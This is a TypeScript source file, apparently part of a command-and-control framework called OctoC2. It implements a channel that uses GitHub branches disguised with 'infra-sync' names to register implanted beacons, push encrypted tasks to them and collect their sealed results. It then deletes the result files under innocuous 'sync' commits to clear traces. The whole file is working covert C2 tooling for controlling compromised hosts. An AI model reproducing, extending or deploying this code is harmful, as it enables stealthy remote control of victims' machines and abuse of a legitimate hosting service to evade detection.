/**
 * OctoC2 Server — BranchChannel
 *
 * Polls dedicated git branches every pollIntervalMs for beacon activity.
 * Each beacon uses a branch named: refs/heads/infra-sync-{id8}
 *
 * Files on the branch:
 *   ack.json              — { ts: <iso>, pubkey: <base64url> }    beacon → server
 *   task.json             — encrypted Task[] blob                  server → beacon
 *   result-{taskId8}.json — sealed TaskResult blob                 beacon → server
 *
 * Crypto:
 *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
 *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import type { DurablePollState, PollRunner } from "../lib/PollRunner.ts";
import { collectGitHubPages } from "../lib/GitHubPagination.ts";
import {
  claimDeliveries,
  createChannelRunner,
  createRepositoryPollState,
  finishDeliveries,
  processIncomingArtifact,
  rejectArtifact,
  type SecureChannelServices,
} from "./ChannelRuntime.ts";
import {
  assertAcceptedResult,
  checkinAuthorizesTaskDelivery,
  parseCheckinPayload,
  parseTaskResult,
} from "./ChannelServices.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;
const REF_UPDATE_ATTEMPTS = 3;

function isRefConflict(error: unknown): boolean {
  const status = (error as { status?: number } | null)?.status;
  return status === 409 || status === 422;
}

interface BranchChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
  services?:          SecureChannelServices;
}

export class BranchChannel {
  private readonly runner: PollRunner;
  private durableState: DurablePollState | null = null;

  /** beaconIds registered via branch ACK files */
  private readonly branchBeacons = new Map<string, string>();  // beaconId → id8

  /** Branch id8 values we've already seen ACK on (to detect updates) */
  private readonly ackShas = new Map<string, string>();  // id8 → last ACK file etag

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     BranchChannelOpts,
  ) {
    this.runner = createChannelRunner(
      "BranchChannel",
      opts.pollIntervalMs,
      () => this.poll(),
    );
  }

  private defaultBranch: string | null = null;

  start(): void {
    this.runner.start();
    console.log("[BranchChannel] Started polling");
  }

  async stop(): Promise<void> {
    await this.runner.stop();
    console.log("[BranchChannel] Stopped");
  }

  async poll(): Promise<void> {
    const { owner, repo } = this.opts;
    const deliveryEligible = await this.processAckFiles(owner, repo);
    await this.processResultFiles(owner, repo);
    await this.deliverPendingTasks(owner, repo, deliveryEligible);
  }

  private async processAckFiles(
    owner: string,
    repo: string,
  ): Promise<Map<string, string>> {
    const deliveryEligible = new Map<string, string>();
    let refs: any[];
    try {
      refs = await collectGitHubPages(
        (page, per_page) =>
          this.opts.octokit.rest.git.listMatchingRefs({
            owner,
            repo,
            ref: "heads/infra-sync-",
            page,
            per_page,
          }),
        (response) => response.data as any[],
      );
    } catch (err) {
      console.warn("[BranchChannel] Failed to list branches:", (err as Error).message);
      return deliveryEligible;
    }

    for (const ref of refs) {
      // Extract id8 from branch name: refs/heads/infra-sync-{id8}
      const match = (ref.ref as string).match(
        /^refs\/heads\/infra-sync-([a-f0-9]{8})$/,
      );
      if (!match) continue;
      const id8 = match[1]!;

      try {
        const fileResp = await this.opts.octokit.rest.repos.getContent({
          owner, repo,
          path: "ack.json",
          ref:  ref.ref,
        });
        const data = fileResp.data as any;
        if (data.type !== "file" || !data.sha) continue;

        // Skip if ACK hasn't changed
        const sha = String(data.sha);
        if (this.ackShas.get(id8) === sha) continue;
        const encoded = String(data.content ?? "");
        const messageId = `ack:${ref.ref}:${sha}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.pollState,
          {
            messageId,
            payload: encoded,
            cursor: sha,
          },
          "malformed Branch ACK file",
          () => {
            const ack = parseCheckinPayload(
              atob(encoded.replace(/\n/g, "")),
            );
            if (
              ack.beaconId.slice(0, 8).toLowerCase() !== id8
            ) {
              rejectArtifact("ACK identity does not match its branch");
            }
            return ack;
          },
          async (ack) => {
            const status =
              await this.services.identities.verifyAndRegisterCheckin(
              ack,
              ack.beaconId,
              2,
            );
            return {
              outcome: checkinAuthorizesTaskDelivery(status)
                ? "accepted"
                : "duplicate",
              beaconId: ack.beaconId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting ACK file");
        }
        if (processed.outcome === "rejected" || !processed.value) continue;
        this.ackShas.set(id8, sha);
        this.branchBeacons.set(processed.value.beaconId, id8);
        if (
          processed.status === "processed" &&
          processed.outcome === "accepted"
        ) {
          deliveryEligible.set(processed.value.beaconId, id8);
        }

        console.log(
          `[BranchChannel] Registered beacon ${processed.value.beaconId} from branch infra-sync-${id8}`,
        );
      } catch (err: any) {
        if (err?.status !== 404) {
          console.warn("[BranchChannel] ACK processing error:", (err as Error).message);
        }
      }
    }
    return deliveryEligible;
  }

  private async processResultFiles(owner: string, repo: string): Promise<void> {
    for (const [beaconId, id8] of this.branchBeacons) {
      const branchRef = `refs/heads/infra-sync-${id8}`;

      let treeItems: any[];
      try {
        const refResp = await this.opts.octokit.rest.git.getRef({
          owner, repo, ref: `heads/infra-sync-${id8}`,
        });
        const headSha = refResp.data.object.sha;

        const commitResp = await this.opts.octokit.rest.git.getCommit({
          owner, repo, commit_sha: headSha,
        });
        const treeResp = await this.opts.octokit.rest.git.getTree({
          owner, repo, tree_sha: commitResp.data.tree.sha,
        });
        treeItems = treeResp.data.tree as any[];
      } catch (err: any) {
        if (err?.status !== 404) {
          console.warn(`[BranchChannel] Failed to list branch tree for ${id8}:`, (err as Error).message);
        }
        continue;
      }

      const resultFiles = treeItems.filter(
        (item: any) => typeof item.path === "string" && item.path.startsWith("result-") && item.path.endsWith(".json")
      );

      for (const item of resultFiles) {
        try {
          const fileResp = await this.opts.octokit.rest.repos.getContent({
            owner, repo,
            path: item.path,
            ref:  branchRef,
          });
          const data = fileResp.data as any;
          if (data.type !== "file") continue;

          await _sodium.ready;
          const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);
          const encoded = String(data.content ?? "");
          const taskId8 = item.path.slice(
            "result-".length,
            -".json".length,
          );
          const messageId =
            `result:${branchRef}:${String(item.sha ?? item.path)}`;
          const processed = await processIncomingArtifact(
            this.services,
            this.pollState,
            {
              messageId,
              payload: encoded,
              cursor: String(item.sha ?? item.path),
            },
            "malformed Branch result file",
            async () => {
              const sealed = atob(encoded.replace(/\n/g, "")).trim();
              if (!sealed) rejectArtifact("result file is empty");
              const plainBytes = await openSealBox(
                sealed,
                operatorPublicKey,
                this.opts.operatorSecretKey,
              );
              const result = parseTaskResult(
                new TextDecoder().decode(plainBytes),
              );
              if (result.beaconId !== beaconId) {
                rejectArtifact(
                  "result beaconId does not match its branch",
                );
              }
              if (
                !/^[0-9a-f]{8}$/i.test(taskId8) ||
                !result.taskId.toLowerCase().startsWith(
                  taskId8.toLowerCase(),
                )
              ) {
                rejectArtifact(
                  "result filename does not match signed taskId",
                );
              }
              return result;
            },
            async (result) => {
              const accepted = assertAcceptedResult(
                await this.services.tasks.acceptSignedResult(
                  result,
                  result.beaconId,
                  {
                    channel: `${this.pollState.channel}:result`,
                    messageId,
                  },
                ),
              );
              return {
                outcome: accepted,
                beaconId: result.beaconId,
                taskId: result.taskId,
              };
            },
          );
          if (processed.status === "conflicting_duplicate") {
            rejectArtifact("conflicting result file");
          }
          if (processed.outcome === "rejected" || !processed.value) continue;
          console.log(
            `[BranchChannel] Task ${processed.value.taskId} accepted (success=${processed.value.success})`,
          );

          await this.deleteFileFromBranch(owner, repo, id8, item.path);
        } catch (err) {
          console.warn("[BranchChannel] Result processing error:", (err as Error).message);
        }
      }
    }
  }

  private async deliverPendingTasks(
    owner: string,
    repo: string,
    deliveryEligible: ReadonlyMap<string, string>,
  ): Promise<void> {
    for (const [beaconId, id8] of deliveryEligible) {
      const pending = this.queue.getDeliverableTasks(beaconId, "branch");
      if (pending.length === 0) continue;
      const deliveries = claimDeliveries(
        this.services,
        "branch",
        beaconId,
        pending,
        Math.max(this.opts.pollIntervalMs * 2, 60_000),
      );
      if (deliveries.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) {
        finishDeliveries(
          this.services,
          deliveries,
          "permanent_failure",
          "beacon registry entry is unavailable",
        );
        continue;
      }

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(deliveries.map(({ task: t }) => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        await this.writeFileOnBranch(
          owner, repo, id8,
          "task.json",
          JSON.stringify(encrypted),
          "update",
        );

        finishDeliveries(this.services, deliveries, "delivered");

        console.log(`[BranchChannel] Delivered ${deliveries.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        finishDeliveries(
          this.services,
          deliveries,
          "transient_failure",
          err,
        );
        console.warn(`[BranchChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }

  private async writeFileOnBranch(
    owner: string, repo: string, id8: string,
    path: string, content: string, message: string,
  ): Promise<void> {
    const branchRefShort = `heads/infra-sync-${id8}`;
    const branchRefFull  = `refs/heads/infra-sync-${id8}`;

    const blobResp = await this.opts.octokit.rest.git.createBlob({
      owner, repo, content, encoding: "utf-8",
    });

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      let headSha: string | null = null;
      try {
        const refResp = await this.opts.octokit.rest.git.getRef({
          owner, repo, ref: branchRefShort,
        });
        headSha = refResp.data.object.sha;
      } catch (error: any) {
        if (error?.status !== 404) throw error;
      }
      const baseCommitSha =
        headSha ?? await this.getDefaultBranchHeadSha();
      const baseCommit = await this.opts.octokit.rest.git.getCommit({
        owner,
        repo,
        commit_sha: baseCommitSha,
      });

      const treeResp = await this.opts.octokit.rest.git.createTree({
        owner, repo,
        base_tree: baseCommit.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha:  blobResp.data.sha,
        }],
      });
      const commitResp = await this.opts.octokit.rest.git.createCommit({
        owner, repo,
        message,
        tree:    treeResp.data.sha,
        parents: [baseCommitSha],
      });

      try {
        if (headSha) {
          await this.opts.octokit.rest.git.updateRef({
            owner, repo,
            ref:   branchRefShort,
            sha:   commitResp.data.sha,
            force: false,
          });
        } else {
          await this.opts.octokit.rest.git.createRef({
            owner, repo,
            ref: branchRefFull,
            sha: commitResp.data.sha,
          });
        }
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  private async getDefaultBranchHeadSha(): Promise<string> {
    const { owner, repo } = this.opts;
    if (!this.defaultBranch) {
      const repository = await this.opts.octokit.rest.repos.get({
        owner,
        repo,
      });
      const branch = repository.data.default_branch?.trim();
      if (!branch) throw new Error("repository has no default branch");
      this.defaultBranch = branch;
    }
    const ref = await this.opts.octokit.rest.git.getRef({
      owner,
      repo,
      ref: `heads/${this.defaultBranch}`,
    });
    return ref.data.object.sha;
  }

  private async deleteFileFromBranch(
    owner: string, repo: string, id8: string, path: string,
  ): Promise<void> {
    const branchRefShort = `heads/infra-sync-${id8}`;

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      const refResp = await this.opts.octokit.rest.git.getRef({
        owner, repo, ref: branchRefShort,
      });
      const headSha = refResp.data.object.sha;
      const commitResp = await this.opts.octokit.rest.git.getCommit({
        owner, repo, commit_sha: headSha,
      });
      const treeResp = await this.opts.octokit.rest.git.createTree({
        owner, repo,
        base_tree: commitResp.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha:  null,
        }] as any,
      });
      const newCommit = await this.opts.octokit.rest.git.createCommit({
        owner, repo,
        message: "sync",
        tree:    treeResp.data.sha,
        parents: [headSha],
      });

      try {
        await this.opts.octokit.rest.git.updateRef({
          owner, repo,
          ref:   branchRefShort,
          sha:   newCommit.data.sha,
          force: false,
        });
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  private get services(): SecureChannelServices {
    if (!this.opts.services) {
      throw new Error(
        "BranchChannel secure services are required; refusing unsigned operation",
      );
    }
    return this.opts.services;
  }

  private get pollState(): DurablePollState {
    this.durableState ??= createRepositoryPollState(
      this.services,
      "branch",
      this.opts.owner,
      this.opts.repo,
    );
    return this.durableState;
  }
}
